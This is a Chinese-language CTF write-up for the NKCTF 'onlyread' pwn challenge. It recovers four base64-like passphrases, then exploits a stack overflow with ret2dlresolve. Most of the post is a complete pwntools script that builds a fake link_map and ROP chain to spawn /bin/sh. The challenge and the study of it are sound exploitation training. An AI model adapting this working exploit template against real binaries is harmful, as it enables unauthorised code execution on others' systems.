---
title: nkctf_onlyread
date: 2023-03-26 22:05:12
categories: 
- pwn_wp
tags: 
- pwn
- re
- ret2dlsolve

---

nkctf的onlyread，前面的逆向看了好一会，后面的栈溢出一开始甚至想爆破，但后来想起有个少见的`ret2dlresolve`。

<!-- more -->

编码后和固定的字符串比较，通过4次比较后有一个栈溢出

这个编码有点像base64，改改就能过。

过完4次比较后发现完全没有输出函数，leak不了libcbase，用ret2dlresolve，上网找了个模板。

**exp:**

```py
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)
libc=ELF('../story_attachment/libc.so.6')  
p=process('./'+filename)
# p=remote('node2.yuzhian.com.cn',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

s('V2VsY29tZSB0byBOS0NURiE=')
sleep(1)
s('dGVsbCB5b3UgYSBzZWNyZXQ6')
sleep(1)
s('SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45')
sleep(1)
s('Y2FuIHlvdSBmaW5kIG1lPw==')


read_plt=elf.plt['read']  
write_got=elf.got['read']  
vuln_addr=elf.sym['main']  
plt0=elf.get_section_by_name('.plt').header.sh_addr

#bss  
bss=0x404060 
bss_stage=bss+0x100
l_addr=libc.sym['system']-libc.sym['read']  
  
pop_rdi=0x0000000000401683  
pop_rsi=0x0000000000401681  

plt_load=plt0+6

def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):
    linkmap=p64(offset&(2**64-1))

    linkmap+=p64(0) 
    linkmap+=p64(fake_linkmap_addr+0x18) 

    linkmap+=p64((fake_linkmap_addr+0x30-offset)&(2**64-1)) 
    linkmap+=p64(0x7) 
    linkmap+=p64(0)

    linkmap+=p64(0)

    linkmap+=p64(0) 
    linkmap+=p64(known_func_ptr - 0x8) 

    linkmap+=b'/bin/sh\x00'
    linkmap=linkmap.ljust(0x68,b'a')
    linkmap+=p64(fake_linkmap_addr) 
    linkmap+=p64(fake_linkmap_addr+0x38) 
    linkmap=linkmap.ljust(0xf8,b'a')
    linkmap+=p64(fake_linkmap_addr+0x8) 
    return linkmap

fake_link_map=fake_Linkmap_payload(bss_stage, write_got ,l_addr)

payload=b'a'*56+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_stage)+p64(0)+p64(read_plt)
payload+=p64(pop_rsi)+p64(0)*2
payload+=p64(pop_rdi)+p64(bss_stage+0x48)+p64(plt_load)+p64(bss_stage)+p64(0)

sl(payload)  

s(fake_link_map) 

itr()
```

